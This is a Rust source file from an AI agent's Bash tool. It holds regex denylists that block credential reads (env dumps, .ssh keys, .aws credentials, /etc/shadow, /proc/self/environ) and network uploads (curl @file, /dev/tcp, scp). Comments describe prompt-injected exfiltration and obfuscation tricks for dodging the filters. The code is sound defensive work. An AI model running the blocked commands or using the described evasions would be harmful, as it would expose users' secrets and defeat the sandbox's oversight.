//! Bash command policy classification and denylists (F20-03 Task 2 split).

use std::path::{Path, PathBuf};
use std::sync::OnceLock;

use regex::RegexSet;
use wcore_sandbox::NetworkPolicy;
use wcore_sandbox::manifest::SandboxManifest;
use wcore_types::tool::ToolResult;

/// Does `command` look like it needs network egress? Used only to attach a
/// helpful hint when such a command FAILS under the no-network sandbox — a
/// false positive merely appends an explanation to an already-failed result,
/// so the match can be liberal.
pub(super) fn looks_network_dependent(command: &str) -> bool {
    let c = command.to_lowercase();
    const NEEDLES: &[&str] = &[
        "curl ",
        "curl\t",
        "wget ",
        "git fetch",
        "git clone",
        "git pull",
        "git push",
        "git remote",
        "npm install",
        "npm i ",
        "npm ci",
        "npx ",
        "pnpm ",
        "yarn ",
        "pip install",
        "pip3 install",
        "cargo install",
        "cargo fetch",
        "cargo update",
        "brew ",
        "apt ",
        "apt-get",
        "nc ",
        "ncat",
        "telnet",
        "ssh ",
        "scp ",
        "rsync ",
        "ping ",
        "dig ",
        "nslookup",
        "host ",
        "ftp ",
        "http://",
        "https://",
    ];
    NEEDLES.iter().any(|n| c.contains(n))
}

/// The filesystem scope the OS sandbox was actually built from, captured
/// before the [`SandboxCommand`](wcore_sandbox::SandboxCommand) is consumed by
/// the backend, so a failed command can be attributed to a real policy
/// decision rather than guessed at.
#[derive(Debug, Clone, Default)]
pub(super) struct SandboxScope {
    /// The child's working directory — needed because tools report denied
    /// paths RELATIVE to it (`fatal: unable to access '.git/config'`).
    cwd: Option<PathBuf>,
    /// `manifest.fs_read_deny` — paths the policy explicitly denies.
    deny: Vec<PathBuf>,
    /// `fs_read_allow` ∪ `fs_write_allow` — every root the manifest granted.
    allow: Vec<PathBuf>,
}

impl SandboxScope {
    pub(super) fn new(manifest: &SandboxManifest, cwd: Option<&Path>) -> Self {
        let mut allow = manifest.fs_read_allow.clone();
        allow.extend(manifest.fs_write_allow.iter().cloned());
        Self {
            cwd: cwd.map(Path::to_path_buf),
            deny: manifest.fs_read_deny.clone(),
            allow,
        }
    }

    /// True when the manifest carried no FS scoping at all (no policy attached,
    /// or `NoSandboxBackend`): nothing can be attributed, so stay silent.
    fn is_unscoped(&self) -> bool {
        self.deny.is_empty() && self.allow.is_empty()
    }
}

/// Prefixes every supported backend grants unconditionally as part of process
/// bootstrap (see `sandbox_exec::build_profile` / `bwrap` ro-binds). A path
/// under one of these is NOT evidence of a policy denial, so it must never be
/// reported as one. `/var`, `/tmp` and `/private` are deliberately ABSENT:
/// macOS grants those three only as `literal` symlink nodes, not as subpaths,
/// so `$TMPDIR/...` really is outside the sandbox.
#[cfg(windows)]
const ALWAYS_GRANTED_PREFIXES: &[&str] = &[r"C:\Windows", r"C:\Program Files"];
#[cfg(not(windows))]
const ALWAYS_GRANTED_PREFIXES: &[&str] = &[
    "/usr", "/bin", "/sbin", "/dev", "/etc", "/opt", "/System", "/Library", "/proc", "/sys", "/nix",
];

/// Why a path named in a failed command's output was unreachable.
#[derive(Debug, PartialEq, Eq)]
enum DeniedBecause {
    /// Explicitly listed in `manifest.fs_read_deny`.
    PolicyDeny,
    /// Not under any root the manifest granted.
    NotGranted,
}

/// Pull the path-shaped tokens out of a tool result body. Deliberately crude:
/// the caller only trusts a token once it matches the manifest, so a
/// false-positive token costs nothing.
fn candidate_paths(body: &str) -> Vec<&str> {
    body.split(|c: char| c.is_whitespace() || c == '\'' || c == '"' || c == '`')
        .map(|token| token.trim_end_matches([':', ',', '.', ';', ')', ']']))
        .filter(|token| {
            token.len() > 1
                && (token.starts_with('/') || token.starts_with("./") || {
                    // Bare relative paths only count when they contain a
                    // separator, so ordinary words are not treated as paths.
                    token.contains('/') && !token.contains("://")
                })
        })
        .collect()
}

/// Classify one path token against the scope. `None` means "no evidence this
/// path was blocked by the sandbox" — the default, so an unrelated failure is
/// never given a fabricated cause.
fn classify(scope: &SandboxScope, token: &str) -> Option<(PathBuf, DeniedBecause)> {
    let raw = Path::new(token);
    let resolved = if raw.is_absolute() {
        raw.to_path_buf()
    } else {
        scope
            .cwd
            .as_ref()?
            .join(raw.strip_prefix("./").unwrap_or(raw))
    };
    if scope.deny.iter().any(|d| resolved.starts_with(d)) {
        return Some((resolved, DeniedBecause::PolicyDeny));
    }
    if scope.allow.iter().any(|a| resolved.starts_with(a)) {
        return None;
    }
    if ALWAYS_GRANTED_PREFIXES
        .iter()
        .any(|p| resolved.starts_with(p))
    {
        return None;
    }
    Some((resolved, DeniedBecause::NotGranted))
}

/// When a sandboxed command FAILS and its output names a path this workspace's
/// policy actually put out of reach, say so.
///
/// B1 (`+GIT-SBX`): under the STRICT profile — the default for every workspace
/// that has not been trusted — `git` exits 128 on every invocation and the only
/// thing the user sees is
/// `fatal: unable to access '/Users/me/.gitconfig': Operation not permitted`,
/// which reads like their machine is broken. Three separate policy decisions
/// produce it (`$HOME/.gitconfig` is granted to the trusted profile but not the
/// strict one; `<root>/.git/config` is on the secret deny-list; `<root>/.git/objects`
/// is denied so `git log -p` cannot reconstruct a committed secret). The third is
/// load-bearing anti-exfiltration and CANNOT be widened — measured on macOS
/// seatbelt, `git status` / `diff` / `log` all need the object store, so there is
/// no profile edit that restores git without also restoring `git log -p`. The
/// denial therefore stays; what changes is that it is no longer mute.
///
/// Attribution is evidence-based, never guessed: a path is only named when it
/// matches this manifest's own deny-list or falls outside every root the
/// manifest granted.
pub(super) fn annotate_sandbox_denial(scope: &SandboxScope, mut result: ToolResult) -> ToolResult {
    if !result.is_error || scope.is_unscoped() {
        return result;
    }
    let mut denied: Vec<(PathBuf, DeniedBecause)> = Vec::new();
    for token in candidate_paths(&result.content) {
        if let Some(hit) = classify(scope, token)
            && !denied.iter().any(|(seen, _)| *seen == hit.0)
        {
            denied.push(hit);
        }
    }
    if denied.is_empty() {
        return result;
    }

    result.content.push_str(
        "\n\n⚠ The OS sandbox — not a broken machine and not a missing tool — put these \
         paths out of reach of this command:",
    );
    for (path, why) in &denied {
        let reason = match why {
            DeniedBecause::PolicyDeny => "explicitly denied by this workspace's policy",
            DeniedBecause::NotGranted => "outside every root granted to this workspace",
        };
        result
            .content
            .push_str(&format!("\n  • {} — {reason}", path.display()));
    }
    result.content.push_str(
        "\nThis workspace is running under the STRICT (untrusted) sandbox profile, which is \
         the default until a workspace is trusted.",
    );
    if scope
        .deny
        .iter()
        .any(|denied| denied.ends_with(".git/objects"))
    {
        result.content.push_str(
            " That profile also denies the git object store (`.git/objects`) so a committed \
             secret cannot be reconstructed with `git log -p` / `git show`. `git status`, \
             `diff`, `log` and `commit` all read that store, so NO git command can succeed \
             here — retrying will not help, and git is not broken or missing.",
        );
    }
    result.content.push_str(
        "\nDo NOT report git, a compiler, node/npm, or the Command Line Tools as absent or \
         needing installation, and do not invent any other cause. Remedy: run once with \
         `--trust-workspace` in this directory to switch to the trusted-local profile, or \
         `--dangerously-skip-permissions-and-sandbox` to turn the OS sandbox off entirely.",
    );
    result.is_error = true;
    result
}

/// When a network-dependent command FAILS and the sandbox blocks network,
/// append a clear explanation + the right tools to use, and force `is_error`.
/// This turns the silent "empty output" failure (the 2026-05-31 curl-thrash
/// bug) into an actionable signal so the agent pivots to WebFetch / the `web`
/// search tool instead of retrying curl (and re-prompting for approval) in a loop.
pub(super) fn annotate_network_block(
    command: &str,
    policy: NetworkPolicy,
    mut result: ToolResult,
) -> ToolResult {
    if result.is_error && matches!(policy, NetworkPolicy::Deny) && looks_network_dependent(command)
    {
        result.content.push_str(
            "\n\n⚠ Bash network egress is OFF for this workspace (an untrusted / contained \
             workspace denies network to prevent data exfiltration), so this command could \
             not reach the network — that is why it failed. This is NOT a missing tool: do \
             NOT claim that a package manager, node/npm, git, curl, or the Command Line \
             Tools are absent or need installing, and do not invent any other cause. To \
             enable installs, the user can run this on a trusted workspace or set \
             WAYLAND_BASH_ALLOW_NETWORK=1 to approve egress. To read a URL now, use the \
             WebFetch tool; to search the web, use the `web` tool with operation \"search\".",
        );
        result.is_error = true;
    }
    result
}

/// Wave SA — Credential-exfiltration denylist for BashTool.
///
/// BashTool returns full stdout to the model, so a command that dumps
/// environment variables, reads a `.env` file, or echoes a named secret
/// places that data in the LLM's context window — from which an attacker
/// with prompt-injection control can exfiltrate it via subsequent tool
/// output / streaming. This is the MAJOR-class finding in v0.2.0 audit.
///
/// We refuse the obvious shapes BEFORE invoking the shell. This is
/// defense-in-depth; the real fix is config-storage hardening
/// (Wave SD's job — chmod 0600, OS keyring, etc.).
///
/// Patterns matched against the raw `command` string:
/// - bare `env` / `env <args>` / `printenv` / `printenv <args>`
/// - bare POSIX `set` (with no args dumps every shell var)
/// - PowerShell `Get-ChildItem env:` (forward-compat for Windows)
/// - `cat`/`tee`/`less`/`more`/`head`/`tail` of a `.env` file
/// - `echo $FOO_API_KEY` / `echo $FOO_SECRET` / `echo $FOO_TOKEN` /
///   `echo $FOO_PASSWORD` style env-var dereference
/// - `printenv FOO_API_KEY` / similar named-secret lookups
fn denylist() -> &'static RegexSet {
    static SET: OnceLock<RegexSet> = OnceLock::new();
    SET.get_or_init(|| {
        // (?i) = case insensitive throughout.
        // ^\s* lets us catch leading whitespace; (?m) is not needed
        // since we test the whole command string as a single line and
        // also do a per-line pass below.
        let patterns = &[
            // Bare `env` / `env <args>` (env-var dump or modify-env exec).
            r"(?i)^\s*env\s*$",
            r"(?i)^\s*env\s+",
            // Bare `printenv` / `printenv <args>` — prints all or named env vars.
            r"(?i)^\s*printenv\s*$",
            r"(?i)^\s*printenv\b",
            // POSIX `set` (no args) — prints all shell variables incl. exported.
            r"(?i)^\s*set\s*$",
            // PowerShell env enumeration (future Windows surface).
            r"(?i)Get-ChildItem\s+env:",
            r"(?i)\$env:[A-Z_]",
            // Reading .env files via common viewers.
            r"(?i)\b(cat|tee|less|more|head|tail)\b[^|;]*\.env(\b|$)",
            // `echo $FOO_API_KEY`, `echo $FOO_SECRET_KEY`, etc.
            r"(?i)\becho\b[^|;]*\$[A-Z_][A-Z_0-9]*_(API_KEY|SECRET|TOKEN|PASSWORD|PASSWD)",
            // `printenv FOO_API_KEY` / named-secret lookup variant
            // (covers the case where the leading `printenv\b` rule didn't
            // catch it because of an alternate denylist tightening).
            r"(?i)\bprintenv\s+[A-Z_][A-Z_0-9]*_(API_KEY|SECRET|TOKEN|PASSWORD|PASSWD)",

            // ── v0.6.1 hardening additions (Sec3) ──────────────────
            // Block reads of well-known credential files. Path-based
            // rather than env-var-based — closes the gap where an
            // attacker `cat`s the on-disk secret instead of echoing
            // an env var.
            r"(?i)\b(cat|less|more|head|tail|tee|bat)\b[^|;]*(\.git-credentials|\.aws/credentials|\.aws/config|\.ssh/id_[a-z0-9_]+|\.ssh/identity[^/]*|\.netrc|\.npmrc|\.pypirc|\.kube/config|\.gcloud/|\.azure/|\.config/wayland/auth|/etc/shadow|/etc/sudoers)",
            // Encoding-based exfil: base64/xxd/od/hexdump/uuencode of
            // credential files or .env. Closes the dodge where an
            // attacker base64s the secret to bypass a plain-read deny.
            r"(?i)\b(base64|xxd|od|hexdump|uuencode|openssl\s+enc)\b[^|;]*(\.git-credentials|\.aws/credentials|\.aws/config|\.ssh/id_[a-z0-9_]+|\.ssh/identity[^/]*|\.netrc|\.npmrc|\.pypirc|\.kube/config|\.gcloud/|\.azure/|\.config/wayland/auth|/etc/shadow|/etc/sudoers|\.env(\b|$))",
            // Linux procfs re-exposes this process's own environment as an
            // ordinary file, so `cat /proc/self/environ` is exactly the `env`
            // dump the first rule in this set refuses — reached by a path the
            // command-name rules never see. The Read tool denies this subtree
            // (`is_denied_proc_path`) and so now do Grep/Glob; without this
            // rule the boundary was enforced on three tools and walked around
            // with the fourth. Deny every per-process form (`self`,
            // `thread-self`, a literal pid) and any command that names it —
            // reader, encoder or interpreter — since nothing legitimate needs
            // this file. Other `/proc` entries (`cpuinfo`, `meminfo`) are
            // untouched.
            r"(?i)/proc/(self|thread-self|\d+)/environ",
            // macOS Keychain extraction via `security` CLI.
            r"(?i)\bsecurity\s+(find-generic-password|find-internet-password|dump-keychain|export)\b",
            // `compgen -e` enumerates exported env vars in bash.
            r"(?i)\bcompgen\s+-e\b",
            // Bash indirect / pattern expansion of env vars.
            r"\$\{!\w+",
            // `printf` and `awk`-based exfil that bypass the existing
            // `echo` rule.
            r"(?i)\bprintf\b[^|;]*\$[A-Z_][A-Z_0-9]*_(API_KEY|SECRET|TOKEN|PASSWORD|PASSWD)",
            r"(?i)\bawk\b[^|;]*ENVIRON",
            // `set -o posix; set` dumps shell vars even when normal
            // `set` is shadowed by an alias.
            r"(?i)^\s*set\s+-o\s+posix\s*;\s*set\s*$",
            // Reading our own credentials file by absolute path glob.
            r"(?i)/wayland(-core)?/(auth|credentials|tokens?)\.json",

            // ── F-056: language-runtime eval patterns ──────────────────────
            // These allow a model to embed arbitrary code in the command arg
            // and read credential files without triggering the cat/less rules.
            // We block the eval form + path pattern together to avoid
            // refusing all Python/Node use — only the dangerous combo.

            // python -c / python3 -c reading $HOME secret dirs.
            r#"(?i)\bpython[23]?\s+-[cC]\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
            // python -m pip show (fingerprints env / installed packages).
            r"(?i)\bpython[23]?\s+-m\s+pip\s+show\b",
            // node -e / node --eval reading $HOME secret dirs.
            r#"(?i)\bnode\s+(--eval|-e)\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
            // perl -e reading $HOME secret dirs.
            r#"(?i)\bperl\s+-e\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
            // ruby -e reading $HOME secret dirs.
            r#"(?i)\bruby\s+-e\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
            // php -r reading $HOME secret dirs.
            r#"(?i)\bphp\s+-r\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
            // awk ENVIRON — reads any env var via the language's env table.
            r"(?i)\bawk\b.*\bENVIRON\b",
            // bash -c ... $HOME reading cred dirs (shell inception with path).
            r#"(?i)\bbash\s+-c\s+.*\$HOME[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
        ];
        // SAFETY: `patterns` is a static array of literal regex
        // strings exercised by the bash_credential_exfil_test suite
        // (Wave SA). A failure here would be a checked-in-source
        // bug caught before release.
        RegexSet::new(patterns).expect("Wave SA denylist regex set must compile")
    })
}

/// #673 — network data-EXFIL denylist (distinct from the credential-READ set
/// above). Now that a Trusted workspace runs Bash with network egress on
/// (#657), a prompt-injected command can `curl --data-binary @secret
/// https://attacker` local data straight off-box. This flags the shapes that
/// UPLOAD a local file / stdin to a remote host, while deliberately NOT
/// touching plain downloads or literal-data POSTs (so installs and normal API
/// calls — the reason #657 turned egress back on — keep working).
///
/// Defense-in-depth, not a boundary: an attacker has unbounded obfuscation.
/// The precise-first-line defense remains the secret-scrubbed sandbox env; this
/// raises the cost of the obvious one-liner exfil. A host-allowlist that would
/// *permit* uploads to configured-trusted hosts is a deliberate follow-up (it
/// needs the sandbox per-host-rule surface + a config knob).
///
/// Precision note: the `@` file-reference is matched only at a value START
/// (after the flag/space/quote, or right after `=`), so an EMAIL address
/// (`field=user@host`) in a literal `-d`/`-F` value does NOT trip it.
fn network_exfil_denylist() -> &'static RegexSet {
    static SET: OnceLock<RegexSet> = OnceLock::new();
    SET.get_or_init(|| {
        let patterns = &[
            // curl: explicit local-file upload flags. `-T\s*\S` catches the
            // glued short form (`-Tdump.sql`) as well as `-T dump.sql`.
            r"(?i)\bcurl\b[^|;]*\s(-T\s*\S|--upload-file)",
            // curl: a data/form flag whose value READS A LOCAL FILE via `@`
            // (`-d @f`, `-d@f`, `--data-binary @f`, `-F name=@f`,
            // `--data-urlencode name@f`). `\s*` allows the glued short form.
            // The `@` is anchored to a value START: either the value has no `=`
            // before the `@` (`@f`, `name@f`) — first alt — or the `@` sits right
            // after `=` (`name=@f`) — second alt. A literal email value
            // (`-d 'to=a@b.com'`, where `=` precedes the `@`) matches NEITHER.
            // The single-letter flags are CASE-SENSITIVE (`(?-i:…)`) so `-f`
            // (`--fail`) and `-D` (`--dump-header`) — different flags — do NOT
            // match `-F`/`-d`; that would refuse a legit `curl -f https://tok@host`.
            r#"(?i)\bcurl\b[^|;]*\s(?:(?-i:-d|-F)|--data[a-z-]*|--form)\s*['"]?([^\s'"|;=]*@|[^\s'"|;]*=@)"#,
            // wget: post a local file / read the body from a file.
            r"(?i)\bwget\b[^|;]*\s(--post-file|--body-file)\b",
            // httpie: a field that reads a local file — both the "embed file as
            // string" form (`field=@f`) and httpie's canonical multipart UPLOAD
            // form, a BARE `@` (`field@/path`). Anchored to the START of the
            // command/piece as `http`/`https` + space (the httpie invocation
            // `http URL ...`), which excludes a `http(s)://` URL (where `http` is
            // followed by `:`). The bare-`@` alt requires a filepath char
            // (`~`/`.`/`/`) after `@`, so a URL's userinfo `user:pass@host` (host,
            // not a path char, and the `:` breaks the field-name run) is NOT hit.
            r"(?i)^\s*https?\s+[^|;]*(=@|\s[\w.-]+@[~./])",
            // scp: any transfer touching a remote `host:path` (up or down — the
            // upload direction is the exfil; a download false-positive is safe).
            r"(?i)\bscp\b[^|;]*\s[\w.@-]+:[^\s]",
            // rsync: a transfer touching a remote `host:`/`user@host:` target.
            r"(?i)\brsync\b[^|;]*\s[\w.@-]+:[^\s]",
            // bash /dev/tcp|/dev/udp pseudo-device — a shell-native network
            // socket used purely for exfil (`cat f > /dev/tcp/host/port`); it has
            // no legitimate agent use. (nc/ncat/socat are dual-use and left as a
            // documented follow-up rather than risk false positives.) Anchored to
            // an absolute `/dev/tcp/` (start, or after whitespace / a redirect),
            // so an ordinary relative path component (`./dev/tcp/x`, `src/dev/tcp/`)
            // is not flagged.
            r"(?i)(^|[\s<>&])/dev/(tcp|udp)/",
        ];
        RegexSet::new(patterns).expect("#673 network-exfil denylist regex set must compile")
    })
}

/// tools-exec-14/16: best-effort de-obfuscation of trivial shell quoting
/// tricks before the denylist runs. A model (or prompt-injection payload)
/// can dodge the literal `\benv\b` regex with shell forms that the shell
/// collapses back to `env` at parse time but that the raw regex misses:
/// `e''nv`, `e""nv`, `e\nv`, `"env"`, `'env'`. We strip empty quote pairs,
/// backslash-escapes of ordinary chars, and surrounding quotes from each
/// word so the SAME pattern set sees the post-collapse token.
///
/// This is **defense-in-depth only** — it does NOT make the denylist a
/// security boundary. A determined attacker has unbounded obfuscation
/// (`$(printf '\145nv')`, variable indirection, base64-decode-then-eval,
/// runtime path expansion). The real boundaries are the secret-scrubbed
/// sandbox env and the now-default-Deny network policy; this layer just
/// raises the cost of the cheapest one-liner bypasses.
pub(super) fn deobfuscate(command: &str) -> String {
    let mut out = String::with_capacity(command.len());
    let mut chars = command.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            // Empty quote pair: `''` / `""` — shell collapses to nothing.
            '\'' | '"' if chars.peek() == Some(&c) => {
                chars.next(); // consume the closing quote, emit nothing
            }
            // Lone surrounding quote — drop it so `"env"` -> `env`.
            '\'' | '"' => {}
            // Backslash-escape of an ordinary char (`e\nv` -> `env`). Keep
            // the escaped char only; never the backslash. We do not try to
            // interpret C-style escapes — `\n` here is a literal `n` to the
            // shell outside of `$'...'`, which is the case we are hardening.
            '\\' => {
                if let Some(n) = chars.next() {
                    out.push(n);
                }
            }
            other => out.push(other),
        }
    }
    out
}

/// Returns `Some(reason)` if `command` matches a denylist pattern.
/// `None` means the command is allowed through to the shell.
///
/// `pub` so the integration-test crate (`tests/bash_credential_exfil_test.rs`)
/// can assert the denylist directly without spawning shells.
pub fn check_denylist(command: &str) -> Option<&'static str> {
    const WHOLE: &str = "Refused: command pattern matches credential-exfiltration denylist. \
         If you need an environment variable's value for legitimate reasons, \
         ask the user to provide it directly.";
    const CHAINED: &str = "Refused: chained subcommand matches credential-exfiltration denylist. \
         If you need an environment variable's value for legitimate reasons, \
         ask the user to provide it directly.";
    // #673 — network data-upload exfil (own message; distinct concern).
    const NET_EXFIL: &str = "Refused: this command uploads local data to the network \
         (a file/@-reference, --upload-file/-T, --post-file, or a remote scp/rsync), \
         which is a data-exfiltration vector. Downloads and literal-data requests are \
         fine; to send local data off-box, ask the user to run it or approve the destination.";

    let set = denylist();
    let net = network_exfil_denylist();

    // tools-exec-14/16: test both the raw command and a de-obfuscated form
    // (empty-quote / escape / surrounding-quote stripped) so the cheapest
    // `e''nv` / `"printenv"` dodges collapse back onto the pattern set.
    let deobf = deobfuscate(command);
    let variants = [command, deobf.as_str()];

    // Test each whole-string variant first.
    for v in &variants {
        if set.is_match(v) {
            return Some(WHOLE);
        }
        if net.is_match(v) {
            return Some(NET_EXFIL);
        }
    }

    // Also test each `;`/`&&`/`||`/`|`/newline-separated subcommand (raw and
    // de-obfuscated) so that wrapping `env` inside a chained pipeline doesn't
    // bypass the rule. The split is intentionally simplistic — it would
    // over-match inside quoted strings, which is fine for a denylist (false
    // positives are safe; the user can rephrase).
    for v in &variants {
        for sep in [";", "\n", "&&", "||", "|"] {
            for piece in v.split(sep) {
                if set.is_match(piece) {
                    return Some(CHAINED);
                }
                if net.is_match(piece) {
                    return Some(NET_EXFIL);
                }
            }
        }
    }
    None
}
